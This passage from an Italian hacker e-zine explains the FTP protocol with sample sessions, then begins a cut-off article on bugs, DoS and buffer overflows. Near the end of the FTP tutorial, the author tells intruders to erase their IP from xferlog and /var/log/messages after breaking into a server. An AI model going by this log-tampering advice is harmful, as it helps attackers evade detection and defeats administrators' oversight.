cazzo, siamo tutti quanti writers ma cerchiamo di essere un pochino originali  
senza andare a scopiazzare troppo dagli altri, o quantomeno mettiamo i credit
al posto giusto :)

Ok cominciamo. Questo articolo cercherà di essere il più semplice e lineare
possibile, e quando mi hanno chiesto di scrivere riguardo a ciò
ho accettato subito, perchè credo che tale protocollo stia alla base di molte
operazioni dei SysAdmin e dei futuri smanettoni. Non tratterò di alcuna
vulnerabilità che mina o ha minato il protocollo FTP, anche se credo che
nel prossimo numero di Security System potrete trovare qualcosa del genere 
magari con qualche codice interessante. Nel frattempo ricordatevi di installare
Linux sulla vostra macchina se non lo avete ancora fatto, perchè gran parte
del codice e degli esempi saranno eseguiti da lì, anche se a volte fare un 
porting risulta più semplice del previsto; tuttavia per seguire e capire questo
articolo avrete semplicemente bisogno di un client FTP .... tutto qui. Come
dire anche Windows rulezza.

Mi scuso inoltre fin da subito se spesso parlerò di cose che magari ai newbies
saranno già ben note... ma questo non vuole essere un articolo per i newbies 
in stato di apprendimento avanzato (anche se vi consiglierei comunque di
leggere la sezione che riguarda il funzionamento dal punto di vista tecnico
del protocollo FTP), quindi sarei molto dispiaciuto di ricevere flame vari ...
nel caso li faceste perchè scrivo una merda ok, allora li prenderò in
considerazione :D ... nel caso voleste sapere qualcosina in più riguardo
l'FTP andatevi a guardare la RFC 959, che è ancora lo standard e che verrà
allegata in questo numero di Security System.

                       [ Tecnologia Client - Server ]

Il concetto generale di client - server è un qualcosa di profondamente semplice.
In pratica su Internet vi stanno dei computer che si collegano ad altri per
sfruttarne uno o più servizi (questi vengono chiamati client), ed altri computer
che invece forniscono tali servizi (definiti server). Un esempio di servizio
potrebbe essere lo FTP. Il problema che inizialmente ci si pose è che un server
avrebbe dovuto o potuto fornire più di un servizio (come quello di posta o il
web stesso), ma come potevano i client collegarsi ad un server o distinguerne
i determinati servizi? Ecco che quindi fu introdotto il concetto di porta.
Credo che qualcuno tratterà questo argomento sul primo numero di Security
System, quindi non mi dilungherò più di tanto. In parole povere ad ogni servizio
è stata assegnato una porta dalla IANA (l'organo su Internet che gestisce 
l'amministrazione e le scelte delle porte "non effimere" che vanno dalla 1 alla
1023), che lo distingue dagli altri. Per esempio la porta a cui i client FTP si 
connettono per sfruttare i servizi di un server FTP è la 21. Questo è lo 
standard, poi nessuno nega il fatto che un amministratore di sistema possa 
cambiare la porta dello FTP per vari scopi, magari perchè vuole mantenere il 
servizio ma celarlo agli occhi di ospiti indesiderati. E vai di hosts.allow ed 
hosts.deny almeno :D

Quando un client si connette ad un server solitamente emette un'apertura
attiva, mentre il server esegue un'apertura passiva. Il concetto di apertura
attiva o passiva (o di chiusura attiva o passiva) è altrettanto semplice
del concetto client-server. In parole povere, in italiano, "passivo" indica
un qualcosa o qualcuno che subisce un'azione, mentre "attivo" indica qualcuno
o qualcosa che compie un'azione. Se abbiamo detto che un client FTP quando
si connette ad un server FTP emette un'apertura attiva mentre quest'ultimo
ne esegue una passiva, cosa succede quando la connessione viene chiusa? Beh
solitamente è il client che manda al server un comando come EXIT o QUIT,
avvertendo l'altro capo della connessione che non ha più intenzione di scambiare
dati. Da ciò deduciamo che è il client che esegue l'azione di chiudere la 
connessione (quindi emette una chiusura attiva), mentre il server subisce
l'azione (e quindi esegue una chiusura passiva). Detto così sembra che le
aperture e le chiusure attive vengano sempre fatte dal client, ed invece
quelle passive vengano sempre fatte dal server: con l'FTP vedremo che
ciò non è sempre vero, anche se in linea di massima (specialmente con altri 
protocolli) le cose andranno così.

                            [ Cosa è l'FTP? ]

Ok il protocollo FTP è lo standard su Internet che permette di trasferire file
da un sistema ad un altro. Bisogna tuttavia non fare confusione tra il servizio
di trasferimento file (fornito appunto dall'FTP) e quello invece di accesso
ai file (come per esempio lo NFS o lo stesso NETBIOS). Solitamente per usufruire
dei servizi messi in auge da un server FTP abbiamo bisogno di un account
regolare, vale a dire un nome utente ed una password che permettano di
identificarci in un dato sistema, anche se spesso viene consentito
un accesso "anonimo" di cui parleremo in seguito. La domanda è : come si fa
a collegarsi ad un server ftp attraverso un client? Beh.. naturalmente dovreste
avere "il client" a portata di mano (che in tutti i sistemi operativi è un file
chiamato come standard "ftp"). Se sappiamo per esempio che il nostro provider
ha un server ftp chiamato ftp.provider.it possiamo collegarci ad esso nei
seguenti modi:

scriviamo semplicemente:

ftp ftp.provider.it [INVIO]

oppure inputiamo da tastiera:

ftp [INVIO]
ci appare un prompt del tipo
ftp>
e da lì scriviamo
open ftp.provider.it [INVIO]

Beh mi rendo conto di aver fatto la cosa un pò troppo semplice... quell'INVIO
tra parantesi quadre naturalmente corrisponde al tasto da premere, non a ciò
che si deve scrivere. Il primo ftp corrisponde al nome del file, il secondo
argomento ftp.provider.it corrisponde al nome del server a cui dobbiamo
connetterci, mentre notiamo che non viene specificata nessuna porta; perchè?
Abbiamo detto che la porta standard per un server FTP è la 21 quindi se non
la specifichiamo il client sa che dovrà connettersi ad essa, ma volendo
potremmo anche inputarla dopo il nome del server. Nel secondo esempio
abbiamo invece semplicemente richiamato il nome del file del client (ftp per
l'appunto) e dopo che ci è apparso il prompt dei comandi "ftp>" abbiamo
digitato un nuovo comando : "open". Questo non fa altro che aprire una
connessione verso ftp.provider.it o sulla porta ftp standard o su una
specificata da noi nella linea di comando. Assumendo quindi di avere presso
quel server un account del tipo: 

username = giorgi
password = kendykendy

possiamo aprire una sessione ftp in questo modo: (da notare che ometterò anche
la pressione del tasto [INVIO] perchè son sicuro che avrete già capito quando
premerlo)

ftp ftp.provider.it
[ ci colleghiamo al server FTP ]

Connected to ftp.provider.it
[ Il client ci avverte del fatto che sta negoziando la sessione FTP con il 
  server ]

220 ftp.provider.it FTP server (Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 
    2000) ready.
[ Il server ci risponde fornendoci la sua versione e dicendoci che si
  è pronti per cominciare la sessione ftp ]

Name (xabino:xabino):

[ Il server ci invita ad inputare uno username. Se stiamo su macchine 
  multiutente come win nt o le unix like in generale ci verrà fornito il nome
  della macchina da cui ci stiamo collegando verso il server ftp (il primo 
  xabino), e l'username col quale ci siamo loggati in quella macchina (il 
  secondo xabino). Se premiamo [INVIO] senza inputare nulla diremo al server
  ftp.provider.it che l'username con il quale vogliamo loggarci ad esso è
  "xabino", ma in realtà abbiamo visto che quello che ci è stato affidato dal
  nostro provider è giorgi, di conseguenza scriveremo "giorgi" ].

331 Password required for giorgi.
    Password:

[ A questo punto il server ci dice di inputare una password. Scriveremo
  "kendykendy" ma non verrà stampata sullo schermo per motivi di sicurezza ]

230 User giorgi logged in.
    Remote system type is UNIX.
    Using binary mode to transfer files.

Adesso siamo loggati a tutti gli effetti nel server; possiamo inputare
dei comandi per interagire con esso ... ma non è quel che dobbiamo fare in 
questo momento. In pratica non preoccupiamoci ancora di cosa è successo in 
dettaglio.

                       [ Punto di vista tecnico ]

Abbiamo capito come ci si logga in un server FTP, più tardi vedremo anche
quali comandi del protocollo FTP sono stati utilizzati per tale operazione.
Adesso ci spostiamo verso un argomento un pò più tecnico del protocollo FTP:
ovvero come viene implementato e come vengono gestite le connessioni.

Praticamente l'FTP si differisce da tutte le altre applicazioni come il Telnet
o da tutti gli altri protocolli come lo SMTP, perchè non usa una connessione 
per trasferire file bensì 2.

La prima viene definita connessione di controllo; essa si stabilisce nella
normale fase client-server (cioè quando il client si connette al server
come abbiamo visto prima). Il server esegue un'apertura passiva sulla porta 21;
viceversa il client esegue un'apertura attiva sulla porta 21 per stabilire la
connessione di controllo. Ma qual è lo scopo di tale connessione? Questa
serve per inviare i comandi FTP dal client verso il server e per ricevere le
repliche di quest'ultimo.

La seconda connessione viene chiamata connessione dati e viene creata ad hoc
ogni volta che viene trasferito un file tra il client ed il server.

Come vengono gestisti, trasferiti ed immagazzinati i dati attraverso il
protocollo FTP? Le caratteristiche standard presenti sono le seguenti:

1. Tipo di file.
	a. Tipo di file ASCII
         (Default) il file viene trasferito lungo la connessione dei dati
         in modo NVT ASCII. Il mittente dovrà convertire il file locale
	   in NVT ASCII ed il ricevente dovrà fare viceversa. Viene usato
	   per trasferire file di tipo testo.
	b. Tipo di dati EBCDIC
	c. Tipo di file binario
	   I file vengono mandati come stream di bit (in parole povere come
	   sequenze di bit). Viene usato normalmente per trasferire file binari.	
      d. Tipo di file locale
	   Il mittente può specificare il numero di bit per byte. Per i sistemi
	   che usano byte da 8 bit il tipo di file locale equivale al tipo file
	   binario.

2. Controllo del formato. Scelta accessibile solamente per i tipi di file ASCII
   o EBCDIC.
	a. Nonprint.
	   (Default) Il file non contiene nessuna informazione verticale del
	   formato.
	b. Controllo del formato Telnet.
	c. Controllo del carrello Fortran.

3. Struttura
	a. Struttura del file.
	   (Default) Il file viene considerato come uno stream continuo di 
	   byte. Non esiste struttura interna del file.
	b. Struttura a record.
	   Questa struttura viene usata solamente con i file di testo (ASCII
	   o EBCDIC).
	c. Struttura della pagina.
	   Il file viene considerato come un insieme di pagine, e questo 
	   permette di far immagazzinare al ricevente delle pagine anche in
	   ordine sparso.

4. Modo di trasmissione. Specifica come viene trasferito il file lungo la
   connessione dei dati.
	a. Modo Stream.
	   (Default) Il file viene trasferito come stream di byte. Con una
	   struttura del file la fine di questo viene indicata dal mittente
	   semplicemente chiudeno la connessione dei dati. Con una struttura
	   a record viene trasmessa una sequenza speciale di 2 byte che indica
	   la fine del record.
	b. Modo Block.
	   Il file viene trasferito come una serie di blocchi.
	c. Modo Compresso.
	   La compressione nei file di testo dovrebbe riguardare le stringhe
	   vuote, ed in un file binario dovrebbero essere compresse le stringhe
	   di 0 byte. Questa opzione viene usata ed implementata raramente
	   in quanto ci sono modi migliori per comprimere dei file.

Non bisogna confondersi od andare in panico leggendo tutte queste opzioni. 
Spesso, anzi sempre, le opzioni usate e sicuramente supportate saranno:

	Tipo di file: ASCII o binario
	Controllo del formato: solo nonprint
	Struttura: solo struttura del file
	Modo di trasmissione: solo modo stream

Praticamente gli unici modi che useremo per trasferire file saranno:

	ASCII per i file di tipo testo
	binario per i file binari

I comandi del protocollo FTP sono all'incirca una 30ina, ma quelli che verranno
usati più spesso saranno solamente una decina. I comandi sono parole di 3 o 4
lettere che il client invia al server, ed a cui spesso vengono forniti degli
alias direttamente dall'implementazione del client in modo da renderli più
immediati e familiari. Per esempio il comando FTP che permette di cambiare
directory sarebbe: 

CWD /percorso/al/nomedelladirectory

con un client ftp questo verrà quasi sicuramente sostituito dal comando

cd /percorso/al/nomedelladirectory

In parole povere questa modifica è stata apportata nei client FTP proprio per 
rendere più familiare i comandi ftp con quelli del sistema operativo. O ancora 
il comando ftp per visualizzare dei file o delle directory è:
 	
LIST nomedirectory

mentre con un client ftp basterà un semplice

dir nomedirectory

Non sempre vi è una 
corrispondenza uno-a-uno tra i comandi ftp, talvolta 1 comando dato dal client
corrisponde a 2 comandi del protocollo FTP (e questo è un effetto che vedremo
più avanti). I comandi più utilizzati con l'FTP sono:

ABOR = termina ogni trasferimento dati
LIST directory = ritorna una lista di file o directory
PASS password = ci fa specificare la password sul server
PORT a1,a2,a3,a4,a5,a6 = ci fa specificare il nostro indirizzo IP e la porta
			 effimera a cui il server deve mandare i dati
QUIT = ci disconnettiamo dal server
RETR filename = otteniamo un file dal nome filename
STOR filename = immettiamo nel server un file dal nome filename
SYST = ci viene detto il tipo di sistema operativo del server
TYPE type = ci fa specificare il tipo di opzione: A per i file ASCII I per i 
	    file binari.
USER username = ci fa specificare un username sul server.

Per avere una lista completa dei comandi supportati da un server FTP digitare
HELP una volta loggati ad esso.

Solitamente ad ogni dato comando il server manda una replica che può stare
ad indicare lo stato di una transazione, un errore o semplicemente un 
avvertimento che tutto sta andando per il verso giusto. Per esempio quando
prima abbiamo avviato una sessione FTP verso ftp.provider.it, dopo aver
inserito il nostro Username ci è stato chiesto:

331 Password required for giorgi.

Questa è una replica proveniente dal server che sta ad indicare che l'username
è stato ricevuto correttamente e che adesso bisogna inputare una password. Tali
repliche sono numeri a 3 cifre, (331) seguiti da un messaggio opzionale 
(Password required for giorgi) per la comprensione umana, in modo che l'utente
non debba andare a ricordarsi tutti i codici che un eventuale server potrebbe
ritornare. Repliche tipiche sono per esempio:

125 Data connection already open: transfer starting.
200 Command OK.
214 Help message.
230 User giorgi logged in.
331 Password required for giorgi.
425 Can't open data connection.
452 Error writing file.
500 Syntax error (unrecognized command).
501 Syntax error (invalid arguments).
502 Unimplemented MODE type

Solitamente ogni comando FTP genera solamente un codice di replica, per 
esempio il comando QUIT potrebbe generare la replica 221 Goodbye. Talvolta
però la replica può essere multilinea, come nel caso del comando HELP. In  
questi casi il codice viene stampato sia all'inizio della
replica stessa che alla fine, in modo da indicarne il termine ed evitare
di confonderla con altri output.

In linea di massima la prima cifra presente nelle repliche potrebbe indicare
uno dei seguenti significati a seconda del suo valore:

1 = L'azione è stata già caricata e si deve aspettarne la replica prima di
    mandare un altro comando.
2 = Può essere mandato un nuovo comando (quando per esempio ci siamo loggati
    al server e questo rimane in stato di attesa di uno o più nostri comandi;
    esempio codice 230).
3 = Il comando è stato accettato ma deve esserne inviato un altro per
    completare uno stato della transazione (come nel caso in cui inviamo
    un username ed il server ci prompta per una password; esempio codice 331)
4 = L'azione richiesta non può essere effettuata, ma la condizione dell'errore
    è temporanea quindi si può riprovare il comando (esempio codice 452).
5 = Il comando non è stato accettato e non si dovrebbe riprovare la sua
    esecuzione (esempio quando specifichiamo un modo di trasmissione non
    supportato, diverso da quello ASCII o da quello binario come nel caso del 
    codice 502).

                   [ Come vengono gestite le connessioni? ]

Nella connessione dei dati può accadere una delle seguenti situazioni alla 
volta:

	  * il client manda un file al server
        * il client scarica un file dal server
        * il client ottiene una lista di file o directory dal server

Sul primo ed il secondo punto siamo daccordo; il terzo punto potrebbe creare
un pò di confusione. Effettivamente le repliche generate dal comando LIST
(quindi file o directory) vengono fornite al client non attraverso l'invio di
queste nella connessione di controllo come repliche multilinee, bensì sulla
connessione dei dati. La differenza sostanziale tra connessione di controllo
e connessione dei dati è che mentre la prima resta in vita per tutta la
durata della transazione client - server, fin quando il client non emette
una chiusura attiva (comando QUIT), la seconda può andare e venire a piacimento.
Infatti per ogni richiesta di listing di file o directory o per ogni file
scaricato o immesso dal/nel server FTP, viene aperta una nuova connessione di
controllo su una porta effimera (maggiore di 1023) in modo da non mischiare
i dati che scorrono su un dato socket. Un socket è un flusso di dati 
tra il client ed il server e viceversa; gli elementi che lo identificano sono
l'indirizzo IP del client, il numero di porta del client, l'indirizzo IP del
server ed il numero di porta del server. Questa combinazione viene definita
coppia socket e fa in modo che i dati che riguardano il trasferimento di un file
non si mischino con quelli che ne riguardano un altro. Ma come è possibile tutto
ciò? Beh, basta che vi sia un solo elemento diverso tra una coppia socket
ed un'altra e tutto filerà per il verso giusto. Per esempio poniamo il caso
di dover scaricare 2 file: il primo si chiama rapporti.txt ed il secondo 
giochi.tar. Verrano aperte 2 connessioni dei dati differenti per ogni
trasferimento, ognuno su una data porta anch'essa differente:

Transazione per il file rapporti.txt

CLIENT IP 192.168.0.2			SERVER IP 192.168.0.1
     ----------             SOCKET             ----------
     - CLIENT -	< ---------------------------> - SERVER -
     ----------                                ----------
PORTA CLIENT : 1075                     PORTA SERVER:


Transazione per il file giochi.tar

CLIENT IP 192.168.0.2			SERVER IP 192.168.0.1
     ----------             SOCKET             ----------
     - CLIENT -	< ---------------------------> - SERVER -
     ----------                                ----------
PORTA CLIENT : 1076                     PORTA SERVER:


Abbiamo omesso la porta del server di proposito (in quanto non è la 21 come
molti si aspetteranno, e dopo spiegheremo anche perchè). Come possiamo
vedere in entrambi le transazioni gli indirizzi IP del client e del server
sono gli stessi, mentre cambiano i numeri di porta del client, e ciò fa in
modo che i dati che riguardano il file rapporti.txt non vengano mischiati con 
quelli di giochi.tar.

Adesso vediamo in dettaglio cosa accade nel momento in cui viene fatto il
download, l'upload o il listing di uno o più file. Ciò che sappiamo è che
viene aperta per ciascuno di essi una connessione dei dati differente (e ciò
corrisponde ad un numero di porta del client diverso da transazione a
transazione). Allora:

	1. La creazione della connessione dei dati viene controllata dal
         client, perchè è lui che emette il comando che la richiede.
	2. Il client sceglie un numero di porta effimero sul proprio host
         per la propria connessione dei dati effettuando un'apertura 
         passiva di questa.
	3. Il client manda il numero di porta scelto al server attraverso
         la connessione di controllo usando il comando PORT.
	4. Il server riceve il numero di porta ed esegue un'apertura attiva
         su di essa. La porta usata dal server per far fluire i dati
         è la 20 e non la 21. (La porta 20 viene chiamata ftp-data).

In parole povere nel caso della transazione che riguarda l'invio del file
rapporti.txt avremo queste informazioni nella coppia socket:

CLIENT IP 192.168.0.2			SERVER IP 192.168.0.1
     ----------                                ----------
     - CLIENT -	< ---------------------------> - SERVER -
     ----------                                ----------
PORTA CLIENT : 1075                     PORTA SERVER: 20

Adesso abbiamo capito che la porta 21 è quella che identifica la connessione
di controllo da dove partono le repliche del server ed i comandi del client, 
mentre la 20 è quella che identifica la connessione dei dati da dove vengono 
ricevuti o inviati i bit inerenti i file. Possiamo adesso vedere una sessione 
FTP completa che lista le informazioni di un file chiamato rifle.txt; useremo 
l'opzione -d dell'ftp che ci permette di vedere tutti i comandi del protocollo 
FTP che vengono implicati in una sessione:

ftp -d ftp.provider.it
Connected to ftp.provider.it

[ Qui il client fa un'apertura attiva sulla porta che identifica la connessione
  di controllo: la 21 ]

220 ftp.provider.it FTP server (Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 
    2000) ready.

[ Il server ci dice che è pronto ad avviare la sessione ]

Name (xabino:xabino):

[ inputiamo il nostro login name giorgi e ci viene mostrato il comando
  implicato per questa azione: ]

---> USER giorgi
331 Password required for giorgi.
Password:

[ Inputiamo la nostra password kendykendy. Da questo momento in poi tutto ciò
  che segue "--->" sono i comandi del protocollo FTP che il client invia
  al server sulla connessione di controllo per eseguire determinate azioni. ]

---> PASS XXXX
230 User giorgi logged in.
---> SYST
215 UNIX Type: L8
Remote system type is UNIX
Using binary mode to transfer file.

[ Qui notiamo che dopo aver inserito la password il client manda al server
  un comando che noi non specifichiamo, vale a dire SYST. Questo comando
  non fa altro che ritornare il tipo di sistema operativo del server FTP. Se
  il sistema operativo del server è lo stesso di quello del client allora
  viene usato per default il trasferimento dei file di tipo binario anzichè 
  quello di tipo ASCII. Questa è una convenzione standard
  usata in tutti i client FTP. ]

ftp> dir rifle.txt
PORT 192,168,0,2,4,3
200 PORT command successful.
---> LIST rifle.txt
150 Opening ASCII mode data connection for /bin/ls.
-rw-rw-r--    1 giorgi  giorgi       6709 Giu 26 15:08 rifle.txt
226 Transfer complete.

[ Qui vediamo che non sempre vi è una corrispondenza uno-a-uno tra i comandi
  inputati dal client e i comandi propri del protocollo FTP; infatti il comando 
  "dir rifle.txt" da luogo al comando  
  del protocollo FTP "PORT"; i primi 4 numeri di questo identificano l'IP
  del client separato da virgole anzichè da punti (192,168,0,2), gli altri 2
  numeri identificano la porta che il client userà per la connessione dei dati.
  Tale porta sarà la 1027. Il calcolo di questa si ha prendendo il 5° numero
  del comando PORT, moltiplicandolo per 256 ed aggiungendovi l'ultimo numero di
  tale comando; in questo caso vale a dire 4 * 256 + 3 = 1027. Il secondo 
  comando a cui da via "dir" è "LIST rifle.txt". Viene aperta una connessione
  dei dati di tipo ASCII per il file rifle.txt, dato che non stiamo downloadando
  o uploadando qualcosa sul server, ma stiamo ricevendo solamente sulla nostra
  consolle dei caratteri testuali. Nel caso avessimo downloadato
  quel file sul nostro client sarebbe stata aperta una connessione binaria,
  dato che il comando SYST ha rivelato che il client ed il server hanno
  lo stesso sistema operativo.  
  
  "-rw-rw-r--   1 giorgi   giorgi    6709 Giu 26 15:08 rifle.txt"
  riguardano le proprietà del file ed i permessi applicati su di esso. ]

ftp> quit
---> QUIT
221 Goodbye.

[ In questo modo terminiamo la connessione FTP. ]

Ponendo il caso che la porta per la transazione di controllo del client sia 
stata la 1026 questo è ciò che è successo:

	1. La connessione di controllo viene stabilita dalla porta 1026 del 
         client alla porta 21 del server.
	2. Il client fa un'apertura passiva per la connessione dei dati sulla
         porta 1027, che viene inviata con l'ausilio del comando PORT al
         server.
      3. Il server fa un'apertura attiva per la connessione dei dalla sua
         porta 20 alla porta 1027 del client.
	4. Il server esegue anche la chiusura attiva della connessione dei dati
         quando tutti i dati sono stati trasferiti (in questo caso quando
         viene terminata l'invio della replica del comando LIST).

Nel caso in cui volessimo scaricare il file rifle.txt dal server, al nostro
client possiamo inputare il seguente comando (stiamo appurando che ci siamo
già loggati al server):

ftp> get rifle.txt
local: rifle.txt remote: rifle.txt
---> TYPE I
200 Type set to I.
---> PORT 192,168,0,2,4,7
200 PORT command successful.
---> RETR rifle.txt
150 Opening BINARY mode data connection for rifle.txt (6709 bytes).
226 Transfer complete.
6709 bytes received in 0.000526 secs (1.2e+04 Kbytes/sec)

Il comando utilizzato per scaricare il file è "get". Il file remoto si chiama
rifle.txt e verrà immagazzinato in locale come rifle.txt. Se avessimo voluto
immagazzinarlo con un nome diverso avremmo dovuto scrivere : 

get rifle.txt comelovuoichiamare.txt

Il modo di trasferimento viene 
automaticamente settato a binario (perchè abbiamo detto che il sistema operativo
del client e del server coincidono, e ciò ci viene rivelato dal comando SYST).
Potremmo cambiare il modo da binario ad ASCII digitando prima del comando
"get" il comando "ascii". La replica del server sarebbe:

---> TYPE A
200 Type set to A.

e se adesso facessimo seguire il comando "get rifle.txt" il trasferimento
del file avverrebbe in modalità ASCII.

Dopodichè segue il comando PORT e viene specificato il numero di porta (facendo
i calcoli detti prima) 1031. Se non credete che sia questo il numero di porta,
subito dopo aver scritto get rifle.txt, aprite un'altra finestra di terminale
da linux o un altro command.com da windows e digitate "netstat -a | more".
Cercate di vedere se l'output presenta la porta implicata (in questo caso la
1031); se il file è stato scaricato vedrete lo stato della connessione in 
TIME_WAIT su quella porta, altrimenti lo stato sarà in ESTABLISHED (Vi spiegherò
gli stati della connessione in un altro articolo caso mai :D); ciò sta a 
significare che effettivamente la porta implicata è la 1031. Il comando del
protocollo FTP che ci permette di ottenere un file è RETR. Tutto ciò che segue
sono informazioni inerenti i tempi di trasferimento e la dimensione del file
rifle.txt

Adesso invece poniamo il caso di voler immettere un file residente nell'hard
disk del client nominato rifle.txt, fino all'hard disk del server:

ftp> put rifle.txt
local: rifle.txt remote: rifle.txt
---> PORT 192,168,0,2,4,8
200 PORT command successful.
---> STOR rifle.txt
150 Opening ASCII mode data connection for rifle.txt.
226 Transfer complete.
6814 bytes sent in 0.00228 secs (2.9e+03 Kbytes/sec)

Tutto ciò che abbiamo detto prima per il comando get può essere fatto con
put. Le uniche differenze sono che put serve per immettere un file nel server
e che il comando del protocollo FTP che svolge questa funzione è STOR anzichè
RETR.

L'ultima cosa che ci rimane da dire riguarda l'accesso anonimo fornito da molti
server. Possiamo eseguirlo usando come username "anonymous" e come
password la nostra casella postale (naturalmente nessuno vieta di poterne
inserire anche una falsa :) ma ahimè tutto questo servirà a ben poco perchè
il nostro IP sarà ugualmente loggato :( ... 
Purtroppo al contrario di come credono molti, accesso "anonimo" non significa 
che ci si lascia fare ciò che si vuole, significa solamente che non c'è bisogno
di un username e di una password regolare per loggarsi nel server ed 
usufruire dei suoi servizi. Solitamente con l'accesso anonimo avremo poca
autonomia su un sistema. Ciò significa che le uniche cose che potremo fare 
saranno avere accesso in lettura a gran parte dei dati lì residenti (ciò 
significa che possiamo scaricare molte cose), ma non avremo certamente un grande
accesso in scrittura (onde evitare che qualcheduno sovrascriva file
importanti come passwd, hosts.***** e pippe varie); molti amministratori di
sistema forniscono accesso in scrittura ad una directory nominata "incoming"
dandoci il permesso di immettere nel server file che noi vogliamo, ma non
aspettatevi comunque di avere accesso in scrittura su /etc :D 
Inoltre non crediate che avere accesso in lettura ci permetta di poter
visionare il contenuto dei dati delle directory dei normali utenti o di
file importanti quali cartedicredito.txt o imieisegreticonmegangale.txt ;
non sempre i SysAdmin mettono cose così importanti in cartelle come /pub
sapete ;) 

Anche se molti bug ed exploit che minano i servizi FTP possono essere sfruttati
mediante l'accesso anonimo, ed anche se riuscite a bucare un server in questo
modo, ricordatevi come minimo che esiste un grandissimo figlio di puttana
chiamato xferlog presente su /var/log sotto i sistemi Unix like. Cosa fa
questo simpatico file? Guardate qui... ciò che segue riguarda la sessione FTP
precedente:

Fri Giu 26 16:40:12 2000 1 xabino.xabaras.net 6709 /home/giorgi/rifle.txt a _ i r 
giorgi ftp 0 * c

Oltre alla data, all'orario, al nome del file e alla sua dimensione, potreste
notare un hostname denominato "xabino.xabaras.net" che risolto con il mio DNS
locale da vita all'indirizzo 192.168.0.2. Non fate caso alle altre diciture
presenti (magari in futuro farò un articolo più dettagliato riguardo a
questo argomento), basta che meditiate sulla presenza in questo log di un
indirizzo IP. Fate attenzione a non cacciarci il vostro insomma! Comunque dovrete
solo preoccuparvi di questo file nel caso in cui siate entrati nella shell ed
abbiate eseguito una sessione FTP da lì. Se invece vi interessano gli accessi
anonimi potete dare uno sguardo a /var/log/messages (non si trova sempre in quella
dir...cmq fate un find se non è presente lì).... anche qui preoccupatevi di 
cancellare il vostro IP nel caso vi siate collegati al server ftp della shell per
sfondarla.

A dimostrazione del fatto che spesso con accesso anonimo non si va da nessuna
parte, quest'articolo conclude con un esempio del genere:

ftp> open ftp.provider.it
220 ftp.provider.it FTP server (Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 
    2000) ready.
Name (xabino:xabino): anonymous [INVIO]
331 Guest login ok, send your complete e-mail address as password.
Password: amomegangale@delicata.org [INVIO]
230 Guest login ok, access restrictions apply.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /home/giorgi [INVIO]
550 /home/giorgi: No such file or directory.
ftp> cd /root [INVIO]
550 /root: No such file or directory
ftp> exit [INVIO]
221-You have transferred 0 bytes in 0 files.
221-Total traffic for this session was 800 bytes in 1 transfers.
221-Thank you for using the FTP service on xabino.xabaras.net.
221 Goodbye.

In parole povere dopo aver immesso come username anonymous, come password
amomegangale@delicata.org e dopo che ci sono state affibiate le varie
restrizioni di causa, abbiamo provato ad eseguire un cd /home/giorgi, ma non 
succede niente a dimostrazione del fatto che non possiamo scrutare nelle 
cartelle degli utenti regolari con accesso anonymous. Con la directory /root 
poi neanche a parlarne :D 

Sconsolati allora abbiamo deciso di inputare il comando exit ed andarcene. Se
invece fossimo andati su una directory a noi accessibile quale /pub (per
vederle sarebbe bastato un bel "dir") avremmo potuto visionare le belle
fotografie di Megan Gale mentre girava gli spot di una certa società
telefonica (no pubblicità occulta please :D); ma così purtroppo per voi non
è stato. Mi lustrerò gli occhi da solo per stavolta. Inoltre ricordatevi che
spesso i server FTP che si vedono schiaffato il vostro IP sulle loro porte
non accetterrano connessioni "anonime" nel caso in cui il vostro IP non sia
risolvibile in un hostname. Nel caso abbiate questa sfortuna dite allo
amministratore di sistema del vostro provider di aggiustare i PTR del file
di configurazione del DNS che riguarda il reverse lookup :D

Per oggi direi che è proprio tutto. Mi manca solamente di dirvi che se non
sapete in che punto del sistema di un server FTP vi trovate basterà un
semplice "pwd" che vi dirà in che directory siete posizionati in quel momento;
inoltre c'è da dire che in questo caso il comando del client ftp "pwd" ed il
comando del protocollo ftp "PWD" sono gli stessi. Come dire.... se pwd funziona
anche da linea di comando sui sistemi Unix perchè non farlo funzionare anche
dentro un server ftp? :P

Autore: ][^XaBaRaS^][
e-mail: xabino@freemail.it
Ringraziamenti e Saluti: Naaaaaaaaa deve essere proprio una persona speciale
                         affinchè io possa ringraziarla o salutarla :P

Spunti: TCP/IP Illustrated Volume I
        RFC 959
        Eh si dai.... anche qualche mia esperienza personale :D

P.S. Se state scaricando un file troppo grosso e volete troncare il 
trasferimento basta un semplice CTRL + C per abortirlo. :D


= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =

= *************************************************************************** =
= =========================== [ BUGS ED EXPLOITS ] ========================== =
= *************************************************************************** =

Autore: SySF4|L

Buongiorno o forse data l'ora locale dovrei dire buonanotte (sono le 2.10 e
fuori piove) Risparmio il discorso introduttivo che sicuramente qualcun'altro
si sarà preso la briga di scrivere Uhmmm vedo che nell'indice di questo numero
1 spetta a me parlare di bug ed exploit. Per iniziare vediamo di fare un po'
d'ordine tra demoni, cgi, bug, exploit e compagnia bella. Partiamo dai bug.
I bug non sono altro che errori, di programmi oppure di interi sistemi operativi.
Finora non è mai stato fatto un programma perfetto che non contenesse almeno un
piccolo errore e lo stesso vale per i sistemi operativi Windows o Linux che
siano, avete comprato da poco Windows 2000, nel portafoglio vi sono rimasti
solo un paio di insetti morti (perchè l'avete  comprato ORIGINALE VERO???...
vabbè meglio non indagare) e questo è pure buggato!Ovviamente la cosa non viene
fatta apposta ma tra centinaia di funzioni e milioni di linee di codice è
facile commettere una distrazione o non tenere conto di qualcosa.... anche i
programmatori sono umani. Per fortuna sono sempre errori di piccola entità di
cui manco uno se ne accorge e che non impediscono di lavorare, però il
problema c'è, è presente, e per esempio può essere sfruttato per fare un
attacco D.O.S al sistema. Un attacco D.O.S non ha nulla a che fare col vecchio
sistema operativo di Microsoft; D.O.S. è l'acronimo di Deny Of Service e
consiste nel mandare in blocco qualcosa impedendone il normale funzionamento.
Esempio: per leggere la posta chiunque deve immettere una login e una password,
due parole che nell 99.9% dei casi non superano le 12 lettere. Adesso
supponiamo che in fase di progettazione, nessuno abbia pensato a questa cosa e
che per semplicità abbiano deciso di memorizzare le due stringhe in degli spazi
di memoria di 200 byte ciascuno <<tanto chi vuoi che abbia un nome o si ricordi
una password più lunga di 200 lettere>>. SBAGLIATO! a qualcuno potrebbe venire
in mente di immettere una stringa di 300 o + caratteri solo per la curiosità di
vedere cosa succede. Risultato: i dati sono troppo grandi per essere gestiti,
c'è quello che in gergo si chiama un overflow (uno straripamento) che incasina
